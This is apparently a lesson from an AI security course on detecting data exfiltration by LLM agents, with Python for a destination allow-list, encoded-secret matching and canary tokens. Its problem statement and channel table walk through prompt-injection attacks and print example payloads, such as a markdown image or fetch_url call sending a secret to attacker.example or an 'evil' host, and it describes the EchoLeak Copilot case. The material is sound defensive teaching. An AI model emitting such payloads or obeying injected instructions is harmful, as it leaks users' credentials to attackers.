# Data Exfiltration Paths

> Data leaves through more doors than "send_email": an image the UI renders, a URL the agent fetches, a calendar title, a public comment. Watch the destination, watch the content, and plant a fake secret that should never move. Each catches leaks the others miss, and together they still miss some.

**Type:** Build
**Languages:** Python 3.10+ (stdlib only)
**Prerequisites:** Phase 12 · Prompt injection, direct & indirect
**Time:** ~45 minutes

## Learning Objectives

- Enumerate exfiltration channels in an agent, including the ones with no "send" tool: rendered images, links, URLs, titles, and public posts.
- Implement a destination allow-list that handles subdomains and lookalike hosts.
- Implement content matching that finds a secret, or a fragment of it, after URL, base64 or hex encoding.
- Use canary tokens as a tripwire, and explain why detection is weaker than not having the secret in the session at all.

## The Problem

Your coding agent reads `.env` while debugging a config issue. Later in the same session it reads a GitHub issue with an injection in it. You've blocked `send_email` to external addresses, so you feel fine.

The injection doesn't ask for email. It asks the agent to "add a status badge" to its reply: `![status](https://attacker.example/s.png?k=sk-live-...)`. The chat UI renders it, the browser fetches the image, and the key is in the attacker's access log. Or it asks the agent to "verify" something by opening a Google Form URL with the key in the query string, and `google.com` is on your allow-list. Or it posts a "debug comment" on a public issue on `github.com`, which your agent is allowed to talk to.

Every one of these uses a channel you allowed for good reasons.

## The Concept

### Channels

| Channel | Needs a tool? | Needs a click? | Example |
|---------|---------------|----------------|---------|
| Rendered markdown image | No | No | `![x](https://evil/?d=SECRET)` |
| Link in output | No | Yes | `[details](https://evil/?d=SECRET)` |
| URL fetched by a tool | Yes | No | `fetch_url("https://evil/" + base64(SECRET))` |
| DNS / subdomain | Yes | No | `https://SECRETPART.evil.example/`, a few characters at a time |
| Message body | Yes | No | email, Slack, SMS to an outside address |
| Innocent-looking field | Yes | No | calendar title, file name, commit message, ticket subject |
| Allowed host with user content | Yes | No | a Google Form, a public gist, a comment on a public repo |

### Three detectors

| Detector | Asks | Catches | Misses |
|----------|------|---------|--------|
| **Destination allow-list** | Is this host or email domain one we expect? | Anything to unknown hosts, however encoded | Allowed hosts where anyone can post (Forms, GitHub, Slack webhooks) |
| **Content matching** | Does this payload contain a secret we saw this session? | Secrets to any destination, also URL/base64/hex encoded | Transformations you didn't decode; chunks shorter than the match window |
| **Canary tokens** | Did a planted fake secret move? | Any leak of the canary, with near-zero false positives | Leaks of everything else; it's an alarm, not a lock |

None is enough alone. The real fix is upstream (Lesson 1): don't put secrets and untrusted content in the same session, and use credentials the model never sees (Lesson 8).

## Build It

```bash
cd code
python3 main.py
```

### Step 1: normalise everything that leaves

Tool calls and rendered output both become an `Outbound(channel, dest, payload)`. A markdown image in the final answer is outbound exactly like a `fetch_url` call.

### Step 2: destination allow-list

```python
def destination_ok(self, o: Outbound) -> bool:
    if "@" in o.dest:
        return o.dest.rsplit("@", 1)[1] in self.allow_email_domains
    return any(o.dest == h or o.dest.endswith("." + h) for h in self.allow_hosts)
```

`endswith("." + h)` allows `docs.google.com` and rejects `google.com.attacker.example`. A plain `h in dest` check gets that wrong.

### Step 3: remember secrets as you see them

```python
def observe_private(self, text: str) -> None:
    for value in re.findall(r"=\s*(\S{12,})", text):
        self.secrets.append(norm(value))
```

Every private tool result passes through the monitor. Here it records `KEY=value` pairs; a real one would use a secret scanner's patterns (Lesson 8).

### Step 4: match fragments, after decoding

```python
def contains(self, o: Outbound, values: list[str]) -> bool:
    texts = [norm(d) for d in decodings(o.payload)]
    for v in values:
        runs = {v[i:i + self.window] for i in range(max(1, len(v) - self.window + 1))}
        if any(r in t for r in runs for t in texts):
            return True
    return False
```

Any 10-character run of the secret is enough, after URL-decoding and trying base64 and hex on every long token.

### Step 5: plant a canary

The `.env` file contains a fake AWS key, `AKIAQCANARY7731XQZ9`. No system accepts it, so nothing legitimate ever sends it anywhere. If it moves, something is wrong, whatever the destination.

### Output

```text
exfiltration attempts           destination      content       canary   any
  markdown image                          X            X            .   BLOCK
  markdown link                           X            X            .   BLOCK
  base64 in URL path                      X            X            .   BLOCK
  hex in email body                       X            X            .   BLOCK
  chunked subdomains                      X            .            .   BLOCK
  calendar invite                         X            X            .   BLOCK
  public issue comment                    .            X            X   BLOCK
  allowed host, attacker form             .            X            .   BLOCK
  reversed, to allowed host               .            .            .   pass
  -> 8/9 flagged

legitimate egress               destination      content       canary   any
  email a colleague                       .            .            .   pass
  read the docs                           .            .            .   pass
  comment on our PR                       .            .            .   pass
  our logo in output                      .            .            .   pass
  -> 0/4 flagged
```

- **Chunked subdomains** sends six characters per request. Each chunk is shorter than the match window, so content matching misses it. The allow-list catches it.
- **Allowed host, attacker form** goes to `docs.google.com`, which is allowed. Only content matching catches it.
- **Public issue comment** goes to GitHub, also allowed. It leaks the canary, so two detectors fire.
- **Reversed, to allowed host** gets through all three. Any transformation you didn't think of (reversal, a cipher, one character per comment) beats content matching, and the destination is allowed. That's why the real fix is upstream.

### Run the tests

```bash
python3 -m unittest -v
```

## Use It

| Where | What it does |
|-------|--------------|
| ChatGPT, Claude, Microsoft Copilot | Restrict which image and link URLs rendered output may load |
| Content Security Policy (`img-src`, `connect-src`) | Browser-level allow-list for your own chat UI |
| Egress proxies (Squid, Envoy, cloud firewall rules) | Allow-list hosts for every tool that makes network calls |
| Secret scanners (GitHub secret scanning, gitleaks, trufflehog) | Patterns for real credential formats, for content matching |
| Canarytokens.org, AWS canary keys | Fake credentials that alert when used |
| DLP products | Content matching at scale, with the same false-positive trade-off |

The EchoLeak vulnerability in Microsoft 365 Copilot (CVE-2025-32711) combined two rows of the channel table: an injected email made Copilot output an image URL on a domain the Content Security Policy allowed, and the data left with no click.

## Ship It

`outputs/skill-exfiltration-audit.md` is a skill for auditing an agent's egress: list every channel (including the UI), check each against the three detectors, and write the attempts table for your own agent.

## Exercises

1. **Easy.** Add an attempt that puts the key in a file name: `write_file(path="/tmp/sk-live-...txt")` followed by `upload(path)` to an allowed host. Which detector fires?
2. **Medium.** Make content matching catch the reversed key. What else does your change now flag in the legitimate set, if you add a legitimate case containing a reversed word?
3. **Medium.** Add a per-session counter that blocks a fourth request to the same non-allowed registrable domain. Does it add anything given the allow-list? When would it?
4. **Hard.** Wire the monitor into the Lesson 2 inbox agent: `observe_private` on `search_drive` results, `check` on every tool call and on the final answer. Rerun the eight payloads.

## Key Terms

| Term | What people say | What it actually means |
|------|-----------------|------------------------|
| Exfiltration | "Data leak" | Moving data to a place the attacker can read |
| Egress | "Outbound" | Every channel data can leave through, including rendered output |
| Allow-list | "Whitelist" | The only destinations permitted; everything else is refused |
| Canary token | "Honeytoken" | A fake secret planted so that any use of it is an alarm |
| DLP | "Data loss prevention" | Scanning outbound content for sensitive data |
| Zero-click | "No interaction" | A leak that needs no user action, such as an auto-loaded image |

## Further Reading

- [Simon Willison, posts on exfiltration attacks](https://simonwillison.net/tags/exfiltration-attacks/)
- [Johann Rehberger, Embrace The Red: prompt injection and data exfiltration write-ups](https://embracethered.com/blog/)
- [NVD, CVE-2025-32711 (EchoLeak, Microsoft 365 Copilot)](https://nvd.nist.gov/vuln/detail/CVE-2025-32711)
- [OWASP Top 10 for LLM Applications 2025: sensitive information disclosure](https://genai.owasp.org/llm-top-10/)
- [MDN, Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Canarytokens](https://canarytokens.org/)
